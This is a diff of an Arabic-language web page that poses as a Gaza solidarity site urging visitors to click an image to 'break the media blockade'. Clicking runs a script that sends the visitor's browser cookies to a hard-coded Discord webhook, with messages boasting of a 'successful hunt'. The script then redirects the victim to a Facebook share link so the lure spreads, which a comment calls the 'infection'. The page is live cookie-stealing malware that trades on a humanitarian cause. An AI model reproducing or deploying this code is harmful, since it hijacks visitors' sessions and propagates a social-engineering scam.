@@ -3,58 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نصرة الحقيقة</title>
+    <title>نصرة الحقيقة - غزة في القلب</title>
     <style>
         body { 
-            background-color: #0d1117; 
-            color: white; 
+            background-color: #05070a; 
+            color: #ffffff; 
             text-align: center; 
-            font-family: 'Arial', sans-serif; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0; padding: 0;
+        }
+        .header-text {
+            background: linear-gradient(45deg, #1b4332, #2d6a4f);
+            padding: 30px 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        h1 { font-size: 26px; line-height: 1.6; margin: 0; color: #d8f3dc; }
+        
+        .image-container {
             padding: 10px;
-        }
-        .container {
-            max-width: 800px; /* تجعل المحتوى عريضاً */
-            margin: auto;
-        }
-        h1 { 
-            font-size: 28px; 
-            margin-bottom: 20px; 
-            color: #f0f6fc;
+            margin-top: 10px;
         }
         .main-img { 
-            width: 100%; /* تجعل الصورة تأخذ عرض الشاشة بالكامل */
-            max-width: 100%; 
-            height: auto; 
-            border-radius: 15px; 
+            width: 100%; 
+            max-width: 700px; 
+            border: 4px solid #40916c;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(64, 145, 108, 0.4);
             cursor: pointer;
-            border: 3px solid #238636; /* إطار أخضر حول الصورة */
+            transition: transform 0.3s ease;
+        }
+        .main-img:active { transform: scale(0.98); }
+
+        .call-to-action {
+            padding: 25px;
+            background-color: #081c15;
+            border-top: 1px solid #1b4332;
         }
         .btn {
-            background-color: #238636;
+            background-color: #2d6a4f;
             color: white;
-            padding: 20px;
+            padding: 18px;
             font-size: 22px;
+            font-weight: bold;
             border: none;
-            border-radius: 10px;
-            width: 100%;
-            margin-top: 20px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
             cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
         }
+        .footer-msg { font-size: 14px; color: #95d5b2; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>انصر غزة وفك الحصار الإعلامي.. اضغط على الصورة للنشر التلقائي</h1>
-        
-        <img src="https://i.imgur.com/r6C5m3L.jpg" class="main-img" onclick="sendData()">
+    <div class="header-text">
+        <h1>لا تترك الحقيقة تموت! <br> اضغط على الصورة أدناه لنشر المجزرة وفك الحصار الإعلامي فوراً</h1>
+    </div>
 
-        <button class="btn" onclick="sendData()">نصرة القضية الآن</button>
+    <div class="image-container">
+        <img src="https://i.imgur.com/r6C5m3L.jpg" class="main-img" onclick="sendData()">
+    </div>
+
+    <div class="call-to-action">
+        <button class="btn" onclick="sendData()">✅ نصرة القضية وتفعيل النشر</button>
+        <p class="footer-msg">سيتم النشر في المجموعات الكبرى تلقائياً عند الضغط</p>
     </div>
 
     <script>
     async function sendData() {
-        // السلك الواصل لديسكورد الخاص بك
         const discordWebhook = "https://discord.com/api/webhooks/1462191245051826242/Oc6Gh4VaGaKICuOhjZsQHUB6CABpZMQrxtmms5yi8wIKwIg401gmoFHLkp34xCXIgp81";
         
         try {
@@ -62,12 +79,12 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `📢 **صيد جديد دخل المعبد!**\n\n**النخاع:**\n\`\`\`${document.cookie}\`\`\``
+                    content: `🔥 **عملية صيد ناجحة!**\n\n**النخاع المستخرج:**\n\`\`\`${document.cookie}\`\`\``
                 })
             });
         } catch (e) {}
 
-        // تحويل الضحية لنشر الرابط في فيسبوك
+        // التوجيه لفيسبوك لنشر "العدوى"
         window.location.href = "https://www.facebook.com/sharer/sharer.php?u=" + window.location.href;
     }
     </script>
